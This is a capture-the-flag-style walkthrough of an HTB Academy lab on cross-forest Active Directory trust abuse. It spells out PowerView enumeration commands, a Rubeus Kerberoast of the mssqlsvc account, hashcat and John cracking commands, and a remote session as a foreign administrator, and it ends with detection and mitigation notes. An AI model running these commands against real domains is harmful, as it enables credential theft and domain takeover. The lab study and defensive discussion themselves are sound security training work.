# 🛰️ HTB Academy Lab Walkthrough: Cross-Forest Trust Abuse

## 🔍 Overview
This walkthrough covers the process of performing a cross-forest attack in the HTB Academy lab environment, specifically focusing on Kerberoasting and administrative privilege abuse across forest trusts.

---

## 🗂 Directory Setup & Tools
```powershell
# Set up directories for tools and scripts
New-Item -ItemType Directory -Path C:\Tools\
cd C:\Tools\

# Copy PowerView.ps1 to the tools directory
Copy-Item \\htb-student\c$\tools\PowerView.ps1 .

# Import PowerView module
Import-Module .\PowerView.ps1
```

---

## 🕵️‍♂️ Cross-Forest Trust Discovery
### **Identify Forest Relationships**

#### **Forest and Domain Information**
```powershell
# Enumerate forest information in the INLANEFREIGHT.LOCAL domain
Get-DomainForest -Domain INLANEFREIGHT.LOCAL

# Identify trusted domains within the forest
Get-DomainTrust -Domain INLANEFREIGHT.LOCAL | select Name,Direction
```

#### **Trust Configuration Details**
```powershell
# Gather trust details between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL
Get-DomainTrust -Identity FREIGHTLOGISTICS.LOCAL -Domain INLANEFREIGHT.LOCAL

# List foreign security principals in the trusted domain
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL | select Name, DistinguishedName
```

---

## 🔍 Cross-Forest User Enumeration

### **SPN Discovery**
```powershell
# Enumerate Service Principal Names (SPNs) across the forest trust
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName, SPN

# Focus on mssqlsvc user
Get-DomainUser -Identity mssqlsvc -Domain FREIGHTLOGISTICS.LOCAL | select samaccountname, spn
```

### **Group Membership**
```powershell
# Check group memberships for the mssqlsvc account
Get-DomainUser -Identity mssqlsvc -Domain FREIGHTLOGISTICS.LOCAL | select samaccountname, memberof
```

---

## 🔑 Cross-Forest Kerberoasting

### **Kerberos Ticket-Granting Service (TGS) Extraction**
```powershell
# Execute Kerberoast attack across forest trust for the mssqlsvc user
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

# Key output indicators:
# [*] Target Domain          : FREIGHTLOGISTICS.LOCAL
# [*] Total kerberoastable users : 1
# [*] Hash                   : $krb5tgs$23$mssqlsvc$FREIGHTLOGISTICS.LOCAL$
```

---

## 👥 Admin Password Re-Use & Group Membership

### **Password Reuse Scenarios**
- **Same company management**: Both forests managed by same administrators.
- **Account naming patterns**: Similar admin account names across forests.
- **Password policy weakness**: Shared password practices across domains.
- **Migration artifacts**: Retained credentials during domain transitions.

### **Foreign Group Membership Enumeration**

#### **Identify Cross-Forest Admin Access**
```powershell
# Enumerate foreign security principals in trusted domain
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# Example output:
GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGISTICS,DC=LOCAL
```

#### **SID to Name Conversion**
```powershell
# Convert foreign SID to readable account name
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

# Result: INLANEFREIGHT\administrator
```

### **Cross-Forest Authentication Validation**
```powershell
# Test administrative access across forest trust
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

# Verification commands:
[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS> ipconfig /all
# Verify connection to target forest DC
```

---

## 🆔 SID History Abuse - Cross Forest

### **Attack Concept**
- **Migration scenario**: User moved between forests without proper SID filtering.
- **SID retention**: Original domain SIDs preserved in the SID History attribute.
- **Privilege preservation**: Administrative rights maintained across forest boundaries.
- **Trust exploitation**: SID filtering bypass for unauthorized privilege escalation.

### **Attack Prerequisites**
- **User migration**: Account moved from Forest A to Forest B.
- **SID filtering disabled**: Trust configuration allows external SIDs.
- **Administrative privileges**: Original account had elevated rights in source forest.
- **Trust authentication**: Ability to authenticate across forest boundary.

### **Attack Flow**
```
Forest A (INLANEFREIGHT.LOCAL) → User Migration → Forest B (CORP.LOCAL)
    ↓                                                    ↓
Administrative User                              Migrated User + SID History
    ↓                                                    ↓
Original SID Preserved                          Cross-Forest Admin Access
    ↓                                                    ↓
Retained Privileges                            Unauthorized Escalation
```

---

## 🎯 HTB Academy Lab Solution

### **Lab Environment Setup**
```bash
# RDP to Windows attack host
xfreerdp /v:10.129.44.185 /u:htb-student /p:'Academy_student_AD!'
```

### **🎫 Question: "Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer."**

**Complete Attack Solution:**

**Step 1: Initial Enumeration**
```powershell
# RDP connection established, open PowerShell as Administrator
# Navigate to tools directory
cd C:\Tools\
Import-Module .\PowerView.ps1

# Enumerate SPNs in trusted domain
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
# Expected: mssqlsvc account identified
```

**Step 2: Target Assessment**
```powershell
# Verify target account privileges
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
# Confirm: mssqlsvc is member of Domain Admins group
```

**Step 3: Cross-Forest Kerberoasting**
```powershell
# Execute Kerberoast attack across forest trust
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

# Extract TGS ticket hash from output:
# $krb5tgs$23$mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$[hash_data]
```

**Step 4: Hash Cracking**
```bash
# Transfer hash to Kali/Linux system for cracking
# Save hash to file: mssqlsvc_hash.txt
# Use Hashcat with mode 13100 for Kerberos 5 TGS-REP
hashcat -m 13100 mssqlsvc_hash.txt /usr/share/wordlists/rockyou.txt

# Alternative: Use John the Ripper
john --format=krb5tgs mssqlsvc_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**🎯 Answer**: `[Cleartext password obtained from hash cracking]`

---

## ⚠️ Security Implications

### **Trust Configuration Weaknesses**
- **Bidirectional trusts**: Increase attack surface across forest boundaries.
- **SID filtering disabled**: Allows unauthorized privilege escalation.
- **Foreign group membership**: Cross-forest administrative access.
- **Password reuse**: Shared credentials across forest boundaries.

### **Detection Considerations**
- **Cross-forest authentication**: Monitor unusual authentication patterns.
- **Kerberos ticket requests**: Detect TGS requests across trust boundaries.
- **Foreign security principals**: Audit cross-forest group memberships.
- **SID History monitoring**: Track SID History attribute modifications.

### **Mitigation Strategies**
- **Selective authentication**: Restrict trust authentication scope.
- **SID filtering**: Enable proper SID filtering for external trusts.
- **Privilege isolation**: Separate administrative accounts per forest.
- **Regular auditing**: Review foreign group memberships and trust configurations.

---

## 🔑 Key Takeaways

### **Cross-Forest Attack Vectors**
```
Trust Discovery → Cross-Forest Enumeration → Attack Execution → Forest Compromise
  (PowerView.ps1)   (Get-DomainUser, Get-DomainForeignGroupMember)    (.Rubeus.exe kerberoast)
```

---

## 📝 Conclusion

This walkthrough demonstrates the process of exploiting cross-forest trust relationships to perform Kerberoasting and gain administrative privileges in a lab environment. Proper configuration and monitoring of forest trusts are critical to preventing such attacks.

---

**Completed by [Your Name]**  
**Date: [Today's Date]**

---


**Copyright © 2023 [Your Name]. All rights reserved.**
```powershell
# End of HTB Academy Lab Walkthrough for Cross-Forest Trust Abuse.
```